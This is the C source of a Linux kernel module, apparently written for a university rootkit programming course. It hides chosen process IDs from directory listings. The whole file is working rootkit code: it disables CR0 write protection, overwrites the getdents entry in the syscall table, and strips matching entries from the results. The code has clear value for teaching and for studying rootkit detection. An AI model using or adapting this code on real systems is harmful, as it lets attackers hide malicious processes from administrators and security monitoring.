/*
 * Assignment 03 for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <asm/page.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>

#include <asm/uaccess.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/string.h>
#include <linux/errno.h>

#include<linux/spinlock.h>   
   

#include "sysmap.h"


/* Information for modinfo */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");

void **sys_call_table;
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);

static int call_counter = 0;


static int processes[16] = {-1, -1, -1 , -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
static int argcount = 0;


/* Define module parameters */
module_param_array(processes, int, &argcount, 0000);
MODULE_PARM_DESC(processes, "An array of process ids to hide. Must contain at least one and no more than 16 pids.");


struct linux_dirent {   
        unsigned long   d_ino;   
        unsigned long   d_off;   
        unsigned short  d_reclen;   
        char            d_name[1];   
 };   


/* get PID from the name */
int convert_atoi(char *str)
{
	int res = 0;
	int mul = 1;
	char *ptr;

	for(ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
		if(*ptr < '0' || *ptr > '9')
			return(-1);
		res += (*ptr - '0') * mul;
		mul *= 10;
	}
	return(res);
}

/* Check whether we need to hide this pid */
int hide(pid_t pid)
{
	int i = 0;
	for(i=0;i<argcount;i++)
	{
		 if(processes[i] == pid ) return 1;	
	}	

	return 0;
}

   


asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	call_counter++;
	/* nothing else above this line */
	
	long ret;
	int len = 0;
	int tlen = 0;
	
	ret = (*original_getdents) (fd,dirp,count);	
	tlen = ret;
		
	while(tlen>0)
	{
		len  = dirp->d_reclen;
		tlen = tlen-len;
			
		if((hide(convert_atoi(dirp->d_name))))
			{	
				memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
				ret -= len;
			}
			else if(tlen != 0)
			{	//printk("sub::d_reclen:%d,tlen:%d,dname:%s,\n",dirp->d_reclen,tlen,dirp->d_name);
				dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
			}

		}
	
	call_counter--;
	return ret;

	/* nothing else below this line */
//	return -1;
}


/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000)
	{
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000))
	{
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
    	}
}


/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and replaces the getdents syscall.
 */
int init_module (void)
{
	//int i;
	//struct task_struct *tasks[16];	

	/* check the number of arguments */
	if(argcount > 16)
	{
		return -E2BIG;
	}		
	if(argcount <= 0)
	{
		return -EINVAL;
	}
	
	printk(KERN_INFO "Loading process-hider LKM...\n");
	
	/* get the pointer to the sys_call_table */
	sys_call_table = (void *) sysmap_sys_call_table;

	/* disable the write protection */
	disable_page_protection();
	

	/* replace the syscall getdents */
	original_getdents = (void *) sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;
	
	
	/* reenable the write protection */
	enable_page_protection();
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the original read() syscall.
 */
void cleanup_module (void)
{
	
	disable_page_protection();
	
	sys_call_table[__NR_getdents] = (int *) original_getdents;

	enable_page_protection();

	while(call_counter > 0) {
		/* sleep for some time */
		msleep(10);
	}
	
	/* Finally, log the unloading */
	printk(KERN_INFO "Unloading process-hider... bye!\n");
}
